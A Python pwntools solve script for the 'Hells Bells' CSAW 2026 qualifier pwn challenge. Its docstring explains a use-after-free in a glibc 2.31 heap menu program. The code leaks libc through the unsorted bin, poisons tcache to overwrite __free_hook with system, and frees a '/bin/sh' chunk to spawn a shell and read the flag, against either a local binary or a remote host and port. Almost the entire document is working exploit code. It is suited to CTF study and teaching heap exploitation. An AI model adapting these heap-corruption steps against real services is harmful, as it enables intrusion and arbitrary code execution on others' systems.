#!/usr/bin/env python3
"""
Hells Bells - CSAW 2026 Quals pwn.

Vulnerability: triple use-after-free. `defuse(idx)` (free) never nulls the
`charges[idx]` slot pointer. `rewire` (edit) and `inspect` (view) operate on
`charges[idx]` with no "is this slot still allocated" check, giving an
edit-after-free and a read-after-free on any defused charge.

glibc 2.31: tcache exists but safe-linking does not (added in 2.32), so a
tcache `fd` pointer is raw and directly overwritable via the edit-after-free.
`__free_hook` still exists (removed in 2.34).

Exploit:
  1. Libc leak: plant a >0x410-byte chunk + a small guard chunk (to block
     consolidation with top), defuse the big one -> lands in the unsorted
     bin, `inspect` leaks a main_arena-derived pointer -> libc base.
  2. Tcache poison: plant two same-size (0x18) chunks, defuse both ->
     tcache[0x20]: A -> B. `rewire` A, overwriting its `fd` with
     `&__free_hook` (raw pointer, no safe-linking in 2.31).
  3. Allocate twice from that bin: first alloc returns A (fill with
     "/bin/sh"), second alloc is returned *inside libc* at `__free_hook` -
     write `system` there. `defuse` the "/bin/sh" chunk ->
     `__free_hook("/bin/sh") == system("/bin/sh")` -> shell.

Usage:
    python3 solve_hells_bells.py HOST PORT     # remote/live service
    python3 solve_hells_bells.py --local       # bundled binary via pwntools process()
"""
import os
import sys
from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "thermite-charge")
LIBC = os.path.join(HERE, "libc-2.31.so")

libc = ELF(LIBC, checksec=False)


def start():
    if len(sys.argv) >= 2 and sys.argv[1] == "--local":
        return process(BIN, cwd=HERE)
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
        return remote(host, port)
    print(__doc__)
    sys.exit(1)


io = start()


def add(idx, size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"(0-15): ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"payload: ", data.ljust(size, b"\x00"))


def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"slot: ", str(idx).encode())


def edit(idx, size, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"slot: ", str(idx).encode())
    io.sendafter(b"new payload: ", data.ljust(size, b"\x00"))


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"slot: ", str(idx).encode())
    io.recvuntil(b"payload: ")
    return io.recv(8)


# --- 1. libc leak via the unsorted bin -------------------------------------
add(0, 0x500, b"thermite")     # > 0x410 -> not tcache
add(1, 0x28, b"guard")         # stop consolidation with the top chunk
free(0)                        # -> unsorted bin (fd/bk = main_arena+0x60)
leak = u64(view(0))
unsorted_delta = libc.sym["__malloc_hook"] + 0x70   # main_arena + 0x60
libc.address = leak - unsorted_delta
log.info("libc leak    : %#x", leak)
log.success("libc base    : %#x", libc.address)
assert libc.address & 0xfff == 0, "bad libc base -- offset wrong?"

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
log.info("__free_hook  : %#x", free_hook)
log.info("system       : %#x", system)

# --- 2. tcache poisoning ----------------------------------------------------
PS = 0x18
add(2, PS, b"C")
add(3, PS, b"D")
free(3)
free(2)                        # tcache[0x20]: 2 -> 3
edit(2, PS, p64(free_hook))    # tcache[0x20]: 2 -> __free_hook

# --- 3. overwrite __free_hook and fire -------------------------------------
add(4, PS, b"/bin/sh\x00")     # reuse chunk 2, now holds the command string
add(5, PS, p64(system))        # returned at __free_hook -> __free_hook=system
free(4)                        # free("/bin/sh" chunk) -> system("/bin/sh")

# --- shell ------------------------------------------------------------------
io.sendline(b"cat flag.txt")
io.recvuntil(b"csaw{")
flag = b"csaw{" + io.recvuntil(b"}")
log.success("FLAG: %s", flag.decode())
assert flag.startswith(b"csaw{") and flag.endswith(b"}")
print(flag.decode())
io.close()
